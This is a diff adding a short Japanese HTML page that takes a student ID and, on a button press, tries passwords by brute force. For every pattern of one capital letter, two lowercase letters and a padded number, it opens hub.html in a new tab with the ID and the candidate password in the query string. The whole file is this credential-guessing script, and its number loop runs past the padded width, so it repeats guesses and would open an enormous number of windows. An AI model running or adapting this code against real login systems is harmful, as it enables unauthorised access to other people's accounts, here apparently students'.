@@ -1,0 +1,30 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+</head>
+<body>
+    生徒ID:<br>
+    <input type="number" id="id">
+    <input type="button" value="実行" onclick="exe()">
+    <script>
+        const len = 5;
+        const LStr = ["A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z"];
+        const SStr = ["a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z"];
+        function exe() {
+            LStr.forEach(el1 => {
+                SStr.forEach(el2 => {
+                    SStr.forEach(el3 => {
+                        for (let i = 0; i < 10 ** (len + 1); i++) {
+                            window.open("hub.html?id=" + document.getElementById("id").value + "&pw=" + el1 + el2 + el3 + ("00000" + String(i)).slice(-len), "_blank");
+                        }
+                    });
+                });
+            });
+        }
+    </script>
+</body>
+</html>                                                                                                                  
